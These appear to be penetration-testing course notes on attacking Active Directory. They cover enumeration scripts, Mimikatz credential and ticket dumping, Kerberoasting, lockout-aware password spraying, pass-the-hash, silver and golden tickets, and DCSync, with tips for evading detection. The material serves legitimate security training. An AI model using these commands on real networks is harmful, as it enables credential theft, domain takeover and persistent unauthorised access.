# Active Directory Attacks
> Typically, an attack against Active Directory infrastructure begins with a successful exploit or client-side attack against either a domain workstation or server followed by enumeration of the AD environment. Once you have established a foothold, the goal is to advance our privilege level until we gain control of one or more domains by targeting high-value groups or a Domain Controller
> - high-value groups (compromised a member of Domain Admins group) to gain control of every single computer in the domain
> - a Domain Controller since it can modify all domain-joined computers, executed applications on them, and contains the password hashes of every single domain user account

<br>

## Active Directory Enumeration 

> Once you have compromised a domain user account, you want to enumerate the domain users and learn as much as you can about their group memberships in search of high-value targets.

**Traditional Approach**:
- use the built-in `net.exe` application and it's `net user` sub-command
- to enumerate all local accounts: `net user`
- to enumerate all users in the entire domain: `net user /domain`
	- administrators usually add prefixes/suffixes to user names that identify accounts by their function
- to query information about individual users: `net user <domain_account> /domain`
	- look to see what groups they are part of (i.e. "Domain Admins")
- to enumerate all groups in the domain: `net group /domain`
- in Active Directory, a group (and subsequently all the included members) can be added as member to another group to create a "nested group". This scales well to allow flexability and dynamic group membership customization in large AD implementations
- the `net.exe` command line tool cannot list nested groups and only shows direct user members, thus there are more flexible alternatives that are more effective in larger real-world environments

**Modern Approach**:
> There are several more modern tools capable of enumerating AD environments. PowerShell cmdlets like Get-ADUser work well but they are only installed by default on domain controllers (as part of RSAT), and while they may be installed on Windows workstations from Windows 7 and up, they require administrative privileges to use. That said, you can create a PowerShell script to enumerate AD users along with all the properties of those user accounts.
- a PowerShell script to collect all users along with their attributes:
```powershell
# build LDAP provider path to query information from
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName

# build a SearchRoot to inidicate where in the AD hierarchy the search should start (i.e. the entire AD environement)
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain

# filter by samAccountType attribute for all users in domain (0x30000000 = decimal 805306368)
$Searcher.filter="samAccountType=805306368"
$Result = $Searcher.FindAll()

# tidy up output of script 
Foreach($obj in $Result)
{
	Foreach($prop in $obj.Properties)
	{
		$prop
	}

	Write-Host "------------------------"
}
```
- this will give a lot of output, since user objects have many attributes, so you can specify additional filters to locate members of specific groups (e.g. Domain Admin) or who have certain attributes
- i.e. you can use the `name` property to create a filter for the "Jeff_Admin" user with: `$Searcher.filter="name=Jeff_Admin"`
- this script is extremely flexible and can be modified to assist with other AD enumeration tasks

**Resolving Nested Groups**:
- an adaptation of the PowerShell enumeration script above that uses a filter to extract all records with the `objectClass` set to "Group" and prints only the `name` propery for each group instead of all properties (lists all groups in the domain)
```powershell
# build LDAP provider path to query information from
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName

# build a SearchRoot to inidicate where in the AD hierarchy the search should start (i.e. the entire AD environement)
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain

# filter by groups
$Searcher.filter="(objectClass=Group)"
$Result = $Searcher.FindAll()

# tidy up output of script 
Foreach($obj in $Result)
{
	$obj.Properties.name
}
```
- once you have located a group you want to enumerate further, you can modify the PowerShell enumeration script by setting an appropriate filter on the `name` property 
for each group instead of all properties (lists all groups in the domain)
```powershell
# build LDAP provider path to query information from
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName

# build a SearchRoot to inidicate where in the AD hierarchy the search should start (i.e. the entire AD environement)
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain

# filter by "Secret_Group"
$Searcher.filter="(name=Secret_Group)"
$Result = $Searcher.FindAll()

# tidy up output of script 
Foreach($obj in $Result)
{
	# display the "member" attribute to obtain group members
	$obj.Properties.member
}
```
- this script will dump the names of the DistinguishedName group members of the "Secret_Group"
- if you find another group is a member of this group (a nested group), you can then enumerate it's members by changing the group name to this nested group 
	- i.e. `$Searcher.filter="(name=Nested_Group)"`
- then repeat the process for all nested groups found to unravel nested groups and find  

**Currently Logged on Users**:
- once you have a list of users along with their group membership and have located administrative users, you want to find logged-in users that are members of high-value groups
- logged on users have their credentials cached in memory and you may be able to steal the credentials and authenticate with them
- if you can compromise a Domain Admin account then you can eventually take over the entire domain, however it is more likely that you will not be able to immediately compromise one of these account and will have to perform a "chained compromise"
- this is where you compromise on account/machine to gain access to another, pivot to these second account/machine, to gain access to another, until you reach a Domain Admin
- to do this, you need a list of users logged onto a target, which can be done by interacting with the target directly or tracking a user's active logon sessions on a domain controller or file server
	- the Windows API *NetWkstaUserEnum* requires administrative permissions and returns a list of all users logged onto a target workstation
	- the Windows API *NetSessionEnum* can be used from a regular domain user and returns a list of active user sessions on servers such as file servers or domain controllers
- to use this Windows APIs you can use the `PowerView` PowerShell script (a part of the PowerShell Empire framework) 
- import with: `Import-Module .\PowerView.ps1`
- enumerate logged in users to a specific workstation with: `Get-NetLoggedon -ComputerName <workstation/server>`
	- i.e. `Get-NetLoggedon -ComputerName client251`
	- this uses the *NetWkstaUserEnum* API to enumerate users logged in to Windows 10 client machine (`client251`)
- to retrieve a list of active sessions on a server (i.e. a domain controller or file server): `Get-NetSession -ComputerName <server/domain_controller>`
	- i.e. `Get-NetSession -ComputerName dc01`
	- this uses the *NetSessionEnum* Win32 API t to return a list of active sessions on  the domain controller (`dc01`)
- once you have enumerated group memberships and determined which machine users are currently logged in, you can begin compromising user accounts with the ultimate goal of gaining domain adminstrative privileges

**Enumerating Through Service Principal Names**:
- alternatively to attacking domain user accounts, you can target so-called service accounts which may also be members of high value groups 
- when applications execute they must do so in the context of an operating system user who defines it's context, when services are launched by the system itself they use the context based on a Service Account (i.e. LocalSystem, LocalService, NetworkService, etc.)
- when applications are integrated into Active Directory (i.e. Exchange, SQL, IIS) they are given a unique service identifier known as a Service Principal Name (SPN), which is used to associate the service on a specific server to a service account in Active Directory
- by enumerating all regeristered SPNs in the domain you can obtain the IP address and port number of applications running on servers integrated with the target Active Directory, limiting the need for a broad port scan
- to obtain this information you can query the domain controller in search of specific principal names by editing the previous PowerShell enumeration script
```powershell
# build LDAP provider path to query information from
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName

# build a SearchRoot to inidicate where in the AD hierarchy the search should start (i.e. the entire AD environement)
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain

# filter for SPNs with the string "*http*" in their name (i.e. web servers)
$Searcher.filter="serviceprincipalname=*http*"
$Result = $Searcher.FindAll()

# tidy up output of script 
Foreach($obj in $Result)
{
	Foreach($prop in $obj.Properties)
	{
		$prop
	}
}
```
- this will return results which allow you to easily spot relevant information (i.e. "samaccountname",  "serviceprincipalname")
- from this output you can then attempt to resolve domains using `nslookup` from the Windows client (i.e. `nslookup CorpWebServer.com`) and retrieve the IP address of the server (the domain controller)
- enumeration of registered SPNs narrows allows for either manual detection or tightly scoped port scans

<br>

---

## Active Directory Authentication
> Kerberos is the default authentication mechanisms for Windows Active Directory environments and it uses a ticket-based system. NTLM authentication is also used when a client authenticates to a server by IP address (instead of hostname), if the user attempts to authenticate to a hostname not registered on the Active Directory integrated DNS server, or if a third-party application chooses to use NTLM instead of Keberos. NTLM uses a challenged and response mechanism.


**Cached Credential Storage and Retrieval**:
- Microsoft stores password hashes in the Local Security Authority Subsystem Service (LSASS) memory space, and if you can gain access to these hashes then you can crack them and obtain the cleartext password or reuse them to perform various actions
- the LSASS process is part for the OS and runs as SYSTEM, so you need SYSTEM (or local administrator) permissions to access them on a target machine
- as such, you usually have to start an attack with a local privilege escalation and then use a specialized tool to extract the hashes
- **MimiKatz** is the most popular tool to do this, but due to it's mainstream popularity and well-known signature you should avoid using it as a standalone application
- instead, execute it through a injector like PowerShell or use a built-in tool like Task Manager to dump the entire LSASS process memory, move the dumped data to a helper machine, then from here load the data into MimiKatz
- MimiKatz usage:
	- start MimiKatz with: `mimikatz.exe`
	- engage the *SeDebugPrivilege* so you can interact with a process owned by another account with: `privilege::debug`
	- dump the credentials of all logged-on users using the Sekurlsa module with: `sekurlsa::logonpasswords` -- this should dump hashes from all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions, which you can then attempt to crack to obtain the cleartext password
- alternatively, you can use MimitKatz to exploit Kerberos authentication by abusing TGT (Ticket Granting Tickets) and service tickets by extracting the tickets of logged in users for your own use 
	- to extract all ticket stored in memory run: `sekurlsa::tickets`
	- stealing TGS (Ticket Granting Service) allows you to access only particular resources associated with those tickets
	- stealing a TGT tickets lets you request a TGS for a specific resource you want to target within the domain
- MimiKatz can also export tickets to the hard drive and import tickets into LSASS

**Service Account Attacks**
- when a user wants to access a resource hosted by a SPN, the client requests a service ticket that is generated by the domain controller which is encrypted through the password hash of the SPN
- a service account attack involves requesting a service ticket, extracting it from local memory, saving it to disk, and then attempting to crack the password of the service account 
- to do this you need to use the *KerberosRequestorSecurityToken* class to request the service ticket, which is made available by importing the *System.IdentityModel* namespace, for example:
```powershell
# load System.IdentityModel namespace
Add-Type -AssemblyName System.IdentityModel
# request service ticket from HTTP/CorpWebServer.corp.com SPN
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
```
- you can then use the built-in `klist` command to display all cached Kerberos tickets stored in memory for the local user (i.e. `klist`)
- you can then download the cached service ticket using MimiKatz with the command: `keberos::list /export`
- next, you can try to crack the SPN password hash and decrypt the ticket using brute force or guessing (in a technique known as *Kerberosting*) and then learn the cleartext password of the service account; also, you don't need administrative privileges for this attack:
	- first installed the *kerberoast* package: `sudo apt update && sudo apt install kerberoast`
	- next run `tgsrepcrack.py` and supply a wordlist and the download service ticket: `python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi`
	- note, the service ticket file is binary so tools like Netcat may mangle it during transfer
- this technique can be very powerful if the domain contains high-privilege service accounts with weak passwords, which is not uncommon in many organizations. However, managed or group managed service accounts are employed for the specific SPN, the password will be randomly generated, complex, and 120 characters long, making cracking infeasible.
- you can also use John the Ripper and Hashcat to perform kerberoasting, or use the `Invoke-Kerberoast.ps1` script which automatically enumerates all SPNs in the domans, requests service tickets for all of them, and exports them in a format ready for cracking with both JtR and Hashcat (hence you don't need MimiKatz)

**Low and Slow Password Guessing**:
- performing a brute-force or wordlist authentication attack may result in account lockouts due to too many failed logins, which may result in the account being blocked for further attacks and system administrators being alerted
- to avoid this, you can use LDAP and ADSI to perform a "low and slow" password attack against AD users without triggering an account lockout
- first, you want to look at the domain's account policy with the `net accounts` command
- this will reveral information like "Lockout threshold" and "Lockout observation window" which tells you how many failed attempts you can have until the account is locked and how long after a failed login attempt you are able to make another attempt 
	- i.e. if the *Lockout threshold* is 5 and the *Lockout observation window* is 30 minutes, you could make 192 logins in 24hrs against every domain user without triggering a lockout 
- an attack like this lets you compile a short list of very commonly used passwords and use it against a massive amount of users, which usually reveals quite a few weak account passwords
- to implement this attack you can use the previous AD enumeration PowerShell script, but this time specifying the *DirectoryEntry* instance as a different user to the one you are logged in as 
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName

# test the login "jeff_admin" with the password "Qwerty09!"
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin",
"Qwerty09!")
```
- if the username and password is correct the object creation will be successful, otherwise a exception will be raised with a clear warning that the username and password is incorrect
- using this infomration, you can create a PowerShell script to enumerate all users and perform auentications according to the *Lockout threshold* and *Lockout observation window* (i.e. `Spray-Passwords.ps1`)
	- use the `-Pass` flag to specify a single password to test, the `-File` flag to specify a wordlist to use, and hte `-Admin` flag to test admin accounts
	- i.e. `.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin`



<br>

---  

## Active Directory Lateral Movement
> Once you have the password hashes of targets you could try to crack them an authenticate to a machine with the cleartext password to gain unauthenticated access. Howerver, password cracking takes time and may fail and Kerberos/NTLM do noe use cleartext passwords directly. Hence other lateral movement techniques are required to authenticate to a system and gain code exeuction using only a user's hash or Keberos ticket.

**Pass the Hash**
- the Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or service using a user’s NTLM hash instead of the associated plaintext password.
- this will not work for Kerberos authentication but only for server or service using NTLM authentication
- there are many tools/frameworks that use PtH to allow users to both authenticate and obtain code execution (i.e. PsExec from Metasploit, Passing-the-Hash toolkit, and Impacket), and they all connect to a victim via SMB and perform authentication using an NTLM hash
- most of these tools start a Windows service (i.e. cmd.exe) and communicate with it using Name Pipes through the Service Control Manager API
- a PtH requirement is that SMB is open (port 445) and the Windows *File Sharing and Print Sharing* feature is enabled (common in internal enterprise environments)
- i.e. with Passing-the-Hash toolkit:
	- `pth-winexe -U Admninistrator%<hash> //<ip> cmd`
- PtH works for Active Directory domain account and the built-in local administrator account, but cannot be used to authenticate as any other local admin account 

**Overpass the Hash**:
> With overpass the hash, you can “over” abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user.

- this technique is used once you have compromised a machine that a domain admin user has authenticated to (and which is now caching their credentials and NTLM password hash), to authenticate to a service that uses Kerberos authentication by turning the NTLM hash into a Kerberos ticket
- once you have access to a machine which hash cached a domain admin accounts credentials, use `mimikatz` to dump the NTLM password hash:
	- i.e. from within mimikatz: `sekurlsa::logonpasswords`
- to then turn the NTLM hash into a Kerberos ticket and avoid using NTLM authentication, use mimikatz's `pth` command
	- i.e. from within mimikatz: `sekurlsa::pth /user:<account> /domain:<AD_domain> /ntlm:<ntlm_hash> /run:<process_to_create`
	- i.e. `sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe`
- this will give you a new PowerShell, from which you can execute commands as the user whose NTLM hash you are exploiting 
- next, you need to cache a Kerberos ticket as this user by authenticating to a network share on the domain controller to generate a TGT 
	- from within PowerShell: `net use \\<network_share>` (i.e. `net use \\dc01`)
- from within PowerShell use `klist` to list the newly requested Kerberos ticket, which includes a TGT and a TGS for the CIFS service
- now you have converted the NTLM hash into a Kerberos TGT to use any tools that rely on Kerberos authentication (as opposed to NTLM), such as PsExec
- for instance, you can now use the TGT you have generated and PsExec to obtain code execution on the domain controller by running `./PsExec.exe \\<domain_controller> cmd.exe`
	- i.e. 	`./PsExec.exe \\dc01 cmd.exe`
- like "Pass the Hash", this technique requires access to the special admin share called "Admin$", which in turn requires local administrative rights on the target machine

**Pass the Ticket**:
> A Kerberos TGT only allows you to authenticate on the machine you created for, however a TGS can be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. If that service ticket belongs to the current user, then no administrative privileges are required. 

- "Pass the Ticket" offers more flexability than the two previous techniques as you can choose which machine to use the ticket for
- you can crack a service account hash, obtain the password for the service ticket, and use this to access resources available to the service account; but if a service account is not a local administrator on any servers then you would not be able to perform lateral movement using "pass the hash" or "overpass the hash"
- in Kerberos, the application on the server executing in the context of the service account checks the user’s permissions from the group memberships included in the service ticket. The user and group permissions in the service ticket are not verified by the application though and the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash - in theory - only known to the service account and the domain controller.
- for example, if you authenticate against an IIS server that is executing in the context of the service account iis_service, the IIS application will determine which permissions we have on the IIS server depending on the group memberships present in the service ticket.
- However, with the service account password or its associated NTLM hash at hand, you can forge our own service ticket to access the target resource (i.e. the IIS application) with any permissions we desire. This custom-created ticket is known as a silver ticket and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.
- MimiKatz can be used to craft a silver ticket and inject it into memory through the 
`kerberos::golden` command
- to create the ticket you first need to obtain the "Security Identifier" (SID) of the domain; a unique name for an AD object with the structure `S-R-I-S` 
	- i.e. `S-1-5-21-2536614405-3629634762-1218571035-1116`
	- the "S-1-5" is fairly static within AD and the *subauthority* value is dynamic and consists of two parts:
	- a) the domain's *numeric identifier* (i.e. `21-2536614405-3629634762-1218571035`)
	- b) a *relative identifer* (RID) representing the specific object in the domain (i.e. `1116`)
- to extract the SID of the current user use the `whoami /user`	command and extract the domain SID part from the string returned (the entire string but the RID at then end, i.e. the `1116` part)
- once you have the domain SID, you can craft a silver ticket with the command: `kerberos::golden /user:<account> /domain:<AD_domain> /sid:<domain_sid> /target:<fully_qualified_HostnameOfService> /service:<service_type> /rc4:<service_password_hash> /ppt`
	- i.e. for the IIS service: `kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
	- the `/target:CorpWebServer.corp.com` is the SPN to create the service ticket for
- before running this, you should flush any existing Kerberos tickets with `kerberos::purge` and verify the purge with `kerberos::list`
- To create a silver ticket, we use the password hash and not the cleartext password. If a kerberoast session presented us with the cleartext password, we must hash it before using it to generate a silver ticket.
- Now that we have this ticket loaded into memory, we can interact with the service and gain access to any information based on the group memberships we put in the silver ticket. Depending on the type of service, it might also be possible to obtain code execution.

**Distributed Component Object Model**
- see material (client-side attack)







<br>

---  

## Active Directory Persistence
> On you have gained access and achieved the primary goals of the engagement, your next goal is to obtain persistenc and ensure that you do not lose your access to the compromised machines. This can invovle using tradiational persistence mechanisms or AD-specific ones

**Golden Tickets**:
> In Kerberos, when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is actually the password hash of a domain user account called *krbtgt*. If you are able to get your hands on the krgbt password hash, you can create your own self-made custom TGTs, known as "golden tickets".

- a Golden Ticket grants unlimited domain access and is not changed regularly by default
- once you reach the state where you have access to a member of the Domain Admins group or have compromised the domain controller itself, you can then extract the password of the krgbt account with Mimikatz
- from in the `C:` folder run the MimiKatz command `lsadump::lsa`
	- i.e. `privilege::debug` -> `lsadump::lsa /patch`
- creating a golden ticket and injecting it into memory does not require any administrative privileges, and can even be performed from a computer that is not joined to the domain
- before creating the golden ticket, you should delete any existing Kerberos tickets with `kerberos::purge`
- next, use `whoami /user` to get the domain SID
- then, use the MImiKatz command: `kerberos::golden /user:<account> /domain:<AD_domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt`
	- i.e. `kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt`
	- this creates a golden ticekt for the "fakeuser" account, which is allowed because the domain controller trusts anything correctly encrypted by the krbtgt password hash (however the use of a non-existent username appearing in the logs may alert a system admin)
- with the golden ticket in memory, launch a new command prompt with the MimiKatz command `misc::cmd` and perform lateral movement with PsExec
	- to pivot to the domain controller: `PsExec.exe \\<domain_contoller> cmd.exe`
	- `PsExec.exe \\dc01 cmd.exe`
- golden tickets are an extension of the Overpass the Hash attack an leverage Kerberos authentication, thus if you tried to connect to the IP address of the domain controller instead of the hostname, you'd force the use of NTLM authentication and access would be blocked 


**Domain Controller Synchronization**
> Another way achieve persistence in an Active Directory infrastructure is to steal the password hashes for all administrative users in the domain.

- the best way to do this is, and not leave a trail, is to abuse AD functionality to capture hashes remotely from a workstation 
- in production environments, domains typically have more than one domain controller to provide redundcancy and the Directory Replication Service Remote Protocol uses replication to synchronize these redundant domain controllers
- thus, a domain controller may request an update for a specific object, like an account, with the IDL_DRSGetNCChanges API
- the domain controller receiving a request for an update does not verify that the request came from a known domain controller, but only that the associated SID has appropriate privileges
- hence, If you attempt to issue a rogue update request to a domain controller from a user who is a member of the Domain Admins group, it will succeed
- to do this, run MImiKatz and start the replication using `lsadump::dcsync /user:Administrator` to sync the built-in domain administrator account "Administrator"
- this will dump multiple hashes associated with user password, as well as hashes used with AES encryption
- this technique can be used to request a replication update with a domain controller and obtain the password hashes of every account in Active Directory without ever logging in to the domain controller
